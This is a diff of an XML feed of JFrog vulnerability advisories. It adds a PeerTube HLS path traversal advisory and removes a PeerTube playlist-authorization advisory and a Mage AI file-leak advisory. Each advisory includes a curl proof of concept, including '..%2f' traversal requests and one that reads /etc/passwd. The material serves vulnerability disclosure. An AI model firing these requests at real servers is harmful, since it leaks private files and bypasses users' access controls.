-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PeerTube User Import Authenticated Resource Exhaustion]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-resource-exhaustion/</guid>
@@ -2929,13 +3034,15 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube Arbitrary Playlist Creation via REST API]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-arbitrary-playlist-creation-rest/</guid>
+            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
             <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32945 Medium severity. PeerTube Arbitrary Playlist Creation via REST API]]></description>
+            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
             <content:encoded><![CDATA[## Summary
-This vulnerability allows an existing user to add playlists to a different user’s channel using the REST API.
+This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
+
+
 
 ## Component
 
@@ -2951,52 +3058,21 @@ This vulnerability allows an existing user to add playlists to a different user�
 
 ## Description
 
-The server listens for POST requests to the **/api/v1/video-playlists** path. This path is used for adding a playlist to the PeerTube instance. The **createVideoPlaylist** function receives the request parameters and is in charge of creating the playlist. The following code sets all the parameters of the playlist:
-
-```js
-const videoPlaylist = new VideoPlaylistModel({
-    name: videoPlaylistInfo.displayName,
-    description: videoPlaylistInfo.description,
-    privacy: videoPlaylistInfo.privacy || VideoPlaylistPrivacy.PRIVATE,
-    ownerAccountId: user.Account.id
-}) as MVideoPlaylistFull
-
-videoPlaylist.url = getLocalVideoPlaylistActivityPubUrl(videoPlaylist) // We use the UUID, so set the URL after building the object
-
-if (videoPlaylistInfo.videoChannelId) {
-  const videoChannel = res.locals.videoChannel
-
-  videoPlaylist.videoChannelId = videoChannel.id
-  videoPlaylist.VideoChannel = videoChannel
-}
-
-```
-
-This code sets the owner of the new playlist to be the user who performed the request, and then sets the associated channel to the channel ID supplied by the request, without checking if it belongs to the user. This will allow any user to create a playlist in any existing channel on the server. The playlist will be owned by the attacking user, thus only the attacking user will be able to add and remove videos or change the properties of the playlist, while it will be listed in the web interface as belonging to a different user’s channel.
-
-
+One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
 
 ## PoC
 
-This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
 
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
+1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
+1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
+1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
 
-
-1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
-
-1. Browse to [**http://localhost:3000/api/v1/video-channels**](http://localhost:3000/api/v1/video-channels) and find a video-channel to attack. If there is none, add one to the root user using the web interface. The ID number of the channel will be needed for the next step.
-
-1. Run the following command (insert the user token and channel ID in the proper places):
-
-   ```
-   curl 'http://localhost:3000/api/v1/video-playlists' -H 'Authorization: Bearer user_token' -F "displayName=playlist" -F "videoChannelId=channel_id" -F "privacy=1"
-   ```
-
-   
-
-1. Browse to [**http://localhost:3000/api/v1/video-playlists**](http://localhost:3000/api/v1/video-playlists). The new playlist will be listed there with the attacking user listed as the owner and the attacked channel listed as the playlist’s channel.
-
-1. Using the web interface it will be possible to see the playlist listed in the attacked channel. The attacked user will not see it listed in the “My Library” page, nor will they be able to add or remove videos from it. The attacking user will see it listed under the “My Library” page, and will be able to add or remove videos to it.
+```
+curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
+```
+The .m3u8 file will be returned.
 
 
 
@@ -3344,50 +3420,6 @@ Guest users in the Mage AI framework that remain logged in after their accounts 
 ## PoC
 
 No PoC is supplied for this issue
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-No references are supplied for this issue
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Mage AI file content request remote arbitrary file leak]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/mage-ai-file-content-request-remote-arbitrary-file-leak-jfsa-2024-001039603/</guid>
-            <pubDate>Fri, 23 Aug 2024 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2024-45188, MEDIUM, Mage AI file content request remote arbitrary file leak]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Mage AI file content request remote arbitrary file leak
-
-## Component
-
-mage-ai
-
-## Affected versions
-
-(,)
-
-## Description
-
-Mage AI allows remote users with the "Viewer" role to leak arbitrary files from the Mage server due to a path traversal in the "File Content" request
-
-## PoC
-
-```bash
-curl -X GET
-'http://localhost:6789/api/file_contents/..%2F..%2F..%2Fetc%2Fpasswd?api_key=
-<USER API KEY>' -H 'Authorization: Bearer
-<USER TOKEN>'
-```
-
-
 
 ## Vulnerability Mitigations
 
